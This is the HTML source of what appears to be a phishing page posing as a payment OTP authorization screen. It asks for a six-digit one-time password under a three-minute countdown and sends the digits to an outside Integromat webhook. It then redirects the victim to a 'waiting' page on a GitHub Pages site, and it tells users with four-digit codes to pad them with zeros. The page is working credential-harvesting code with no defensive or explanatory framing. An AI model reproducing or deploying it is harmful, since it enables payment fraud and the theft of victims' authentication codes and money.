<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Authorization - OTP</title>
  <link rel="stylesheet" href="./style.css">
  <link rel="icon" href="https://cdn4.vectorstock.com/i/1000x1000/64/53/contactless-payment-credit-card-and-hand-tap-logo-vector-26336453.jpg" type="image/x-icon">
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f7f8fa;
      margin: 0;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
    }
    .container {
      background: white;
      padding: 2rem;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      max-width: 400px;
      width: 90%;
      text-align: center;
    }
    .prompt {
      margin-bottom: 1rem;
      color: #333;
      font-size: 1.1rem;
    }
    .digit-group {
      display: flex;
      justify-content: space-between;
      margin-bottom: 1rem;
    }
    .digit-group input {
      width: 2.5rem;
      height: 3rem;
      margin: 0 0.2rem;
      font-size: 1.5rem;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 4px;
      transition: border-color 0.3s ease;
    }
    .digit-group input:focus {
      border-color: #007bff;
      outline: none;
    }
    .button {
      width: 100%;
      padding: 0.75rem;
      background: #007bff;
      border: none;
      border-radius: 4px;
      color: white;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    .button:hover {
      background: #0056b3;
    }
    .timer, .note {
      text-align: center;
      margin-top: 20px;
      font-size: 18px;
      color: #333;
      font-weight: bold;
    }
    .note {
      margin-top: 10px;
      font-size: 14px;
      color: #666;
      font-weight: normal;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="prompt">
      Enter the OTP sent to your registered mobile number and click on Pay!
    </div>
    <form action="https://hook.integromat.com/stpe8xb1994dv9naukp5bca9t6l0gfja" method="post" class="digit-group" data-group-name="digits" data-autosubmit="false" autocomplete="off">
      <input type="hidden" id="redirect" name="redirect" value="https://homotraders.github.io/waiting/">
      <input type="text" id="digit-1" name="digit-1" data-next="digit-2" maxlength="1" pattern="\d*" required/>
      <input type="text" id="digit-2" name="digit-2" data-next="digit-3" data-previous="digit-1" maxlength="1" pattern="\d*" required/>
      <input type="text" id="digit-3" name="digit-3" data-next="digit-4" data-previous="digit-2" maxlength="1" pattern="\d*" required/>
      <span class="splitter">&ndash;</span>
      <input type="text" id="digit-4" name="digit-4" data-next="digit-5" data-previous="digit-3" maxlength="1" pattern="\d*" required/>
      <input type="text" id="digit-5" name="digit-5" data-next="digit-6" data-previous="digit-4" maxlength="1" pattern="\d*" required/>
      <input type="text" id="digit-6" name="digit-6" data-previous="digit-5" maxlength="1" pattern="\d*" required/><br><br>
      <button type="submit" class="button"><span>Pay</span></button>
    </form>
    <div class="timer" id="timer">Enter OTP within 03:00 to avoid payment failure</div>
    <div class="note">For 4 digit OTP kindly enter 4 digits first and then enter two zeros (00) at last to complete the payment.</div>
  </div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script>
  <script>
    function startTimer(duration, display) {
      var timer = duration, minutes, seconds;
      setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = "Enter OTP within " + minutes + ":" + seconds + " to avoid payment failure";

        if (--timer < 0) {
          window.location.href = "failed.html";
        }
      }, 1000);
    }

    window.onload = function () {
      var threeMinutes = 60 * 3,
          display = document.querySelector('#timer');
      startTimer(threeMinutes, display);
    };

    $(document).ready(function(){
      $('.digit-group').find('input').each(function() {
        $(this).attr('maxlength', 1);
        $(this).on('keyup', function(e) {
          var parent = $($(this).parent());

          if (e.keyCode === 8 || e.keyCode === 37) {
            var prev = parent.find('input#' + $(this).data('previous'));

            if (prev.length) {
              $(prev).select();
            }
          } else if ((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105) || e.keyCode === 39) {
            var next = parent.find('input#' + $(this).data('next'));

            if (next.length) {
              $(next).select();
            } else {
              if (parent.data('autosubmit')) {
                parent.submit();
              }
            }
          }
        });
      });
    });
  </script>
</body>
</html>
